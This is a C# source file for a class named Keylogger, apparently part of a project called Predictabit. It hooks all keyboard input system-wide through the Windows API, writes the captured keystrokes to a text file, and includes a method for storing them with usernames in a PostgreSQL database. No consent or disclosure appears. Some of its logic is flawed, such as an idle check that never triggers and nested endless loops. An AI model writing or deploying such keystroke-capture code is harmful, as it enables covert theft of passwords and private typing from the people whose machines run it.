using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Npgsql;

namespace Predictabit
{
    public class Keylogger
    {
        private DatabaseConnection _dbConnection;
        private const string LogFile = "keylogger.txt";
        private DateTime lastKeyTime;
        private static LowLevelKeyboardProc _proc;
        private static IntPtr _hookID = IntPtr.Zero;
        private static readonly int IdleTimeoutSeconds = 5; // Seconds of inactivity
        private StringBuilder buffer = new StringBuilder();

        public Keylogger(DatabaseConnection dbConnection)
        {
            _dbConnection = dbConnection;
            lastKeyTime = DateTime.Now;
            _proc = HookCallback;
            _hookID = SetHook(_proc);
        }

        public static void StopKeyLogging()
        {
            UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(13, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && (wParam == (IntPtr)0x0100 || wParam == (IntPtr)0x0104)) // Key down and key up events
            {
                lastKeyTime = DateTime.Now;
                int vkCode = Marshal.ReadInt32(lParam);
                string key = TranslateVkCodeToKeyName(vkCode);

                buffer.Append(key);
                // Check if idle time exceeds the threshold, then log the buffer
                if (DateTime.Now - lastKeyTime >= TimeSpan.FromSeconds(IdleTimeoutSeconds))
                {
                    using (StreamWriter writer = File.AppendText(LogFile))
                    {
                        writer.WriteLine("Key Pressed: " + buffer.ToString());
                    }

                    buffer.Clear();
                }
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
        
        private string TranslateVkCodeToKeyName(int vkCode)
        {
            var keyName = new StringBuilder(256);
            uint scanCode = MapVirtualKey((uint)vkCode, 0);

            int result = ToUnicode((uint)vkCode, scanCode, new byte[256], keyName, keyName.Capacity, 0);

            if (result > 0)
            {
                return keyName.ToString();
            }

            return string.Empty;
        }

        [DllImport("user32.dll")]
        private static extern uint MapVirtualKey(uint uCode, uint uMapType);

        [DllImport("user32.dll")]
        private static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out] StringBuilder pwszBuff, int cchBuff, uint wFlags);

        public void StartKeyLogging()
        {
            using (StreamWriter writer = File.AppendText(LogFile))
            {
                writer.WriteLine($"Keylogger started at {DateTime.Now}");
            }

            while (true)
            {
                using (StreamWriter writer = File.AppendText(LogFile))
                {
                    writer.WriteLine($"User stopped typing for {IdleTimeoutSeconds} seconds.");
                }

                while (true)
                {
                    TimeSpan idleTime = DateTime.Now - lastKeyTime;

                    if (idleTime.TotalSeconds >= IdleTimeoutSeconds && buffer.Length > 0)
                    {
                        using (StreamWriter writer = File.AppendText(LogFile))
                        {
                            writer.WriteLine("Key Pressed: " + buffer.ToString());
                        }

                        buffer.Clear();
                    }
                    Thread.Sleep(1000);
                }
            }
        }
        
        private void LogKeyPressed(string keyData, string username, int tabID)
        {
            // Insert the key press into the database
            _dbConnection.InsertKeyLoggedData(username, tabID, keyData);
        }
        
        private int GetUserId(string username)
        {
            string query = "SELECT user_id FROM Users WHERE username = @username";

            using (NpgsqlCommand cmd = new NpgsqlCommand(query, _dbConnection.OpenConnection()))
            {
                cmd.Parameters.AddWithValue("username", username);
                object result = cmd.ExecuteScalar();

                if (result != null && int.TryParse(result.ToString(), out int userId))
                {
                    return userId;
                }
                
                return -1;
            }
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}
